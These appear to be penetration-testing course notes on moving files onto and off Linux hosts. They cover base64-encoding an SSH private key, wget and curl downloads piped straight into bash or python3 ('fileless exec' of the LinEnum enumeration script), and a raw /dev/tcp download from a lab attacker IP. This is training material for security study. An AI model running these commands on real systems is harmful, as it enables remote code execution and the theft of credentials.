![](https://academy.hackthebox.com/storage/modules/24/LinuxDownloadUpload.drawio.png)
==Base64 Encoding / Decoding==
```bash
md5sum id_rsa  # Check MD5 hash of id_rsa file
cat agent | base64 -w 0; echo  # Encode id_rsa file to base64
```

```bash
echo -n '<base64_encoded_content>' | base64 -d > id_rsa
md5sum id_rsa  # Check MD5 hash of id_rsa file after decoding
```

==File Transfer Using wget==
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
# Fileless exec
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

==File Transfer Using cURL==
```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
# Fileless exec
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

==Download with Bash (/dev/tcp)==
```bash
exec 3<>/dev/tcp/10.10.14.2/8000
echo -e "GET /agent HTTP/1.1\n\n">&3
cat <&3
```

==SSH File Transfer (SCP)==
```bash
scp riley@painters.htb:agent .
```
